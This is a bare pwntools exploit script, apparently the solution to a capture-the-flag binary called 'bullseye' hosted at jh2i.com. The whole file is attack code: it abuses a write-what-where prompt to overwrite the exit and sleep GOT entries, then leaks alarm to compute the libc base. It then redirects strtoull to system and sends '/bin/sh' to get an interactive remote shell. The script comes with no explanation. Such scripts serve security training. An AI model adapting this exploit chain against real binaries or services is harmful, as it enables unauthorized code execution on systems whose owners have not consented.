from pwn import *


def mov(where, what):
    p.sendlineafter("Where do you want to write to?\n", hex(where))
    p.sendlineafter("What do you want to write?\n", hex(what))


exe = ELF("bullseye")
libc = ELF("libc6_2.30-0ubuntu2.2_amd64.so")
context.binary = exe
HOST = "jh2i.com"
PORT = 50031
p = remote(HOST, PORT)

ret = 0x040125f
log.success("ret --> %s" % hex(ret))

p.recvline()
p.recvline()
log.info("overwriting exit with main...")
mov(exe.got["exit"], exe.sym['main'])
mov(exe.got["sleep"], ret)
log.info("overwrite done")
sleep(1)

log.info("leaking alarm...")
alarm = int(p.recvline().strip(), 16)
log.info("alarm leaked")
log.success("Alarm --> %s" % hex(alarm))
sleep(1)

log.info("leaking libc_base...")
libc_base = alarm - libc.sym['alarm']
log.info("libc_base leaked")
log.success("Libc base --> %s", hex(libc_base))
sleep(1)

log.info("overwriting strtoull with system...")
sleep(2)
mov(exe.got['strtoull'], libc_base + libc.sym['system'])
sleep(1)
log.info("overwrite done")
sleep(1)

log.info("sending /bin/sh to spawn a shell")
p.sendline("/bin/sh")
p.recvuntil("Where do you want to write to?\n")
p.interactive()
